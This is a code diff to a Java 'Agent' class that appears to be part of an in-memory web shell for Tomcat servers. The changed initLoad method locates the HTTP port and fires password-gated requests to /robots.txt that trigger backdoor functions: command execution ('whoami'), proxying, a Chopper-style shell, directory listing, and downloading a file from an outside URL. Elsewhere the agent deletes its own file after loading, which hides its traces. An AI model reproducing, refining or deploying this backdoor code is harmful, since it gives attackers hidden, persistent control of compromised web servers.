@@ -170,7 +170,7 @@ public class Agent {
 						try {
 							unlockFile(currentPath);
 						} catch (Exception e) {
-							//pass
+							e.printStackTrace();
 						}
 					}
 					new File(agentFile).delete();
@@ -211,17 +211,24 @@ public class Agent {
 	}
 
 	public static void initLoad() throws Exception {
-		MBeanServer beanServer = ManagementFactory.getPlatformMBeanServer();
-		Set<ObjectName> objectNames = beanServer.queryNames(new ObjectName("*:type=Connector,*"),
-				Query.match(Query.attr("protocol"), Query.value("HTTP/1.1")));
-		String host = InetAddress.getLocalHost().getHostAddress();
-		String port = objectNames.iterator().next().getKeyProperty("port");
-		String url = "http" + "://" + host + ":" + port;
-		String[] models = new String[] { "model=exec&cmd=whoami", "model=proxy", "model=chopper", "model=list&path=.",
-				"model=urldownload&url=https://www.baidu.com/robots.txt&path=not_exist:/not_exist" };
-		for (String model : models) {
-			String address = url + "/robots.txt?" + "pass_the_world=" + Agent.password + "&" + model;
-			openUrl(address);
+		try {
+			MBeanServer beanServer = ManagementFactory.getPlatformMBeanServer();
+			Set<ObjectName> objectNames = beanServer.queryNames(new ObjectName("*:type=Connector,*"),
+					Query.match(Query.attr("protocol"), Query.value("HTTP/1.1")));
+			//String host = InetAddress.getLocalHost().getHostAddress();
+			String host = "127.0.0.1";
+			String port = objectNames.iterator().next().getKeyProperty("port");
+			String url = "http" + "://" + host + ":" + port;
+			String[] models = new String[] { "model=exec&cmd=whoami", "model=proxy", "model=chopper", "model=list&path=.",
+					"model=urldownload&url=https://www.baidu.com/robots.txt&path=not_exist:/not_exist" };
+			for (String model : models) {
+				String address = url + "/robots.txt?" + "pass_the_world=" + Agent.password + "&" + model;
+				openUrl(address);
+			}
+		}
+		catch(Exception e)
+		{
+			e.printStackTrace();
 		}
 	}
 
@@ -234,7 +241,7 @@ public class Agent {
 		StringBuffer bs = new StringBuffer();
 		String l = null;
 		while ((l = buffer.readLine()) != null) {
-			bs.append(l).append("/n");
+			bs.append(l).append("\n");
 		}
 	}
 }
